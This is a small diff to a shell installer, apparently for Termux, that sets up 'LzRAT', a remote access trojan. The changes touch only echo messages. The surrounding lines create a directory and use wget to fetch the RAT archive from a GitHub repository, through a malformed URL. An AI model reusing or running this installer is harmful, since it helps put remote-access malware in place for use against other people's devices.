@@ -35,7 +35,7 @@ echo "${CYN}                                  By lUCIFER   ${NC}"
 if [ ! -d "$PREFIX/opt" ]; then
   echo "${BLUE}Setting UP LzRAT${NC}"
   mkdir "$PREFIX/opt"
-  echo "${GREEN}Directory created${NC}"
+  echo "${GREEN}SETUP Complete${NC}"
 fi
 sleep 3
 if [ -d "$PREFIX/opt/lizrat" ]; then
@@ -47,7 +47,7 @@ sleep 5
 file="lizrat.zip"
 
 if [ -e "$file" ]; then
-  echo "${GREEN}File $file exists.${NC}"
+  echo "${GREEN}File $file exists. NOT Downloading it${NC}"
 else
   echo "${GREEN}$file does not exist. Downloading...${NC}"
   wget -q "https:raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
